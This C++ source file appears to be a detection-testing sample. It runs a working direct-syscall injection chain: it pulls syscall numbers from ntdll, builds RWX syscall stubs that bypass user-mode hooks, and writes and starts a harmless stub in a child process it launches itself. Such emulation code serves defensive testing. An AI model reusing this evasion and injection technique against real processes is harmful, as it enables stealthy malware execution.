#include "..\common\bkaes_sample.h"

static bool BkaesScanSsn(const BYTE *stub, size_t bytes, DWORD *ssn) {
  if (stub == nullptr || ssn == nullptr || bytes < 12) {
    return false;
  }

  for (size_t i = 0; i + 6 < bytes; ++i) {
    if (stub[i] != 0xB8) {
      continue;
    }

    DWORD value = 0;
    memcpy(&value, stub + i + 1, sizeof(value));
    for (size_t j = i + 5; j + 1 < bytes && j < i + 32; ++j) {
      if (stub[j] == 0x0F && stub[j + 1] == 0x05) {
        *ssn = value;
        return true;
      }
    }
  }
  return false;
}

static const BYTE *BkaesResolveNtdllJump(const BYTE *stub) {
  if (stub == nullptr) {
    return nullptr;
  }
  if (stub[0] == 0xE9) {
    int32_t rel32 = 0;
    memcpy(&rel32, stub + 1, sizeof(rel32));
    return stub + 5 + rel32;
  }
  if (stub[0] == 0xEB) {
    return stub + 2 + (int8_t)stub[1];
  }
  if (stub[0] == 0xFF && stub[1] == 0x25) {
    int32_t disp32 = 0;
    const BYTE *target = nullptr;
    memcpy(&disp32, stub + 2, sizeof(disp32));
    memcpy(&target, stub + 6 + disp32, sizeof(target));
    return target;
  }
  return nullptr;
}

static bool BkaesExtractSsn(void *exportAddress, DWORD *ssn) {
  const BYTE *candidate = (const BYTE *)exportAddress;
  for (int depth = 0; depth < 3 && candidate != nullptr; ++depth) {
    if (BkaesScanSsn(candidate, 96, ssn)) {
      return true;
    }
    candidate = BkaesResolveNtdllJump(candidate);
  }
  return false;
}

static BYTE *BkaesCreateSyscallStub(DWORD ssn) {
  BYTE stubBytes[] = {0x4C, 0x8B, 0xD1, 0xB8, 0,    0,    0,    0,
                      0x0F, 0x05, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90};
  memcpy(stubBytes + 4, &ssn, sizeof(ssn));

  BYTE *mem =
      (BYTE *)VirtualAlloc(nullptr, sizeof(stubBytes), MEM_RESERVE | MEM_COMMIT,
                           PAGE_EXECUTE_READWRITE);
  if (mem != nullptr) {
    memcpy(mem, stubBytes, sizeof(stubBytes));
    FlushInstructionCache(GetCurrentProcess(), mem, sizeof(stubBytes));
  }
  return mem;
}

static void BkaesFreeStub(void *stub) {
  if (stub != nullptr) {
    VirtualFree(stub, 0, MEM_RELEASE);
  }
}

int RunDirectSyscallInjectionChain() {
#if !defined(_M_X64)
  BkaesPrint("[SKIP] direct syscall injection chain is x64-only\n");
  return 2;
#else
  struct DirectApi {
    const char *Name;
    void *ExportAddress;
    DWORD Ssn;
    BYTE *Stub;
  } apis[] = {
      {"NtOpenProcess", nullptr, 0, nullptr},
      {"NtAllocateVirtualMemory", nullptr, 0, nullptr},
      {"NtWriteVirtualMemory", nullptr, 0, nullptr},
      {"NtProtectVirtualMemory", nullptr, 0, nullptr},
      {"NtCreateThreadEx", nullptr, 0, nullptr},
  };

  HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
  PROCESS_INFORMATION child = {};
  HANDLE process = nullptr;
  HANDLE thread = nullptr;
  PVOID remote = nullptr;
  SIZE_T regionSize = 0x1000;
  SIZE_T written = 0;
  ULONG oldProtect = 0;
  BYTE stub[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
  NTSTATUS status = (NTSTATUS)0xC0000001;
  OBJECT_ATTRIBUTES oa;
  BkaesClientId cid;

  if (ntdll == nullptr) {
    BkaesPrint("[FAIL] ntdll unavailable\n");
    return 1;
  }

  for (auto &api : apis) {
    api.ExportAddress = (void *)GetProcAddress(ntdll, api.Name);
    if (api.ExportAddress == nullptr ||
        !BkaesExtractSsn(api.ExportAddress, &api.Ssn)) {
      BkaesPrint("[FAIL] syscall SSN extraction failed api=%s\n", api.Name);
      return 1;
    }
    api.Stub = BkaesCreateSyscallStub(api.Ssn);
    if (api.Stub == nullptr) {
      BkaesPrint("[FAIL] syscall stub allocation failed api=%s\n", api.Name);
      for (auto &cleanup : apis) {
        BkaesFreeStub(cleanup.Stub);
      }
      return 1;
    }
  }

  if (!BkaesLaunchSelfChild(&child, CREATE_NO_WINDOW)) {
    BkaesPrint("[FAIL] child launch err=%lu\n", GetLastError());
    for (auto &api : apis) {
      BkaesFreeStub(api.Stub);
    }
    return 1;
  }

  InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
  cid.UniqueProcess = (HANDLE)(ULONG_PTR)child.dwProcessId;
  cid.UniqueThread = nullptr;
  status = ((NtOpenProcessFn)(void *)apis[0].Stub)(
      &process,
      PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION |
          PROCESS_VM_WRITE | PROCESS_VM_READ,
      &oa, &cid);
  if (status >= 0) {
    status = ((NtAllocateVirtualMemoryFn)(void *)apis[1].Stub)(
        process, &remote, 0, &regionSize, MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE);
  }
  if (status >= 0) {
    status = ((NtWriteVirtualMemoryFn)(void *)apis[2].Stub)(
        process, remote, stub, sizeof(stub), &written);
  }
  if (status >= 0) {
    PVOID protectBase = remote;
    SIZE_T protectSize = regionSize;
    status = ((NtProtectVirtualMemoryFn)(void *)apis[3].Stub)(
        process, &protectBase, &protectSize, PAGE_EXECUTE_READ, &oldProtect);
  }
  if (status >= 0) {
    status = ((NtCreateThreadExFn)(void *)apis[4].Stub)(
        &thread, THREAD_ALL_ACCESS, nullptr, process, remote, nullptr, 0, 0, 0,
        0, nullptr);
  }

  if (thread != nullptr) {
    WaitForSingleObject(thread, 2000);
    CloseHandle(thread);
  }

  BkaesPrint("[OK] direct syscall injection chain targetPid=%lu remote=%p "
             "status=0x%08X\n",
             child.dwProcessId, remote, (unsigned)status);
  BkaesSettleTelemetry(3500);
  if (remote != nullptr && process != nullptr) {
    VirtualFreeEx(process, remote, 0, MEM_RELEASE);
  }
  if (process != nullptr) {
    CloseHandle(process);
  }
  BkaesCleanupProcess(&child);
  for (auto &api : apis) {
    BkaesFreeStub(api.Stub);
  }
  return (status >= 0 && thread != nullptr) ? 0 : 1;
#endif
}
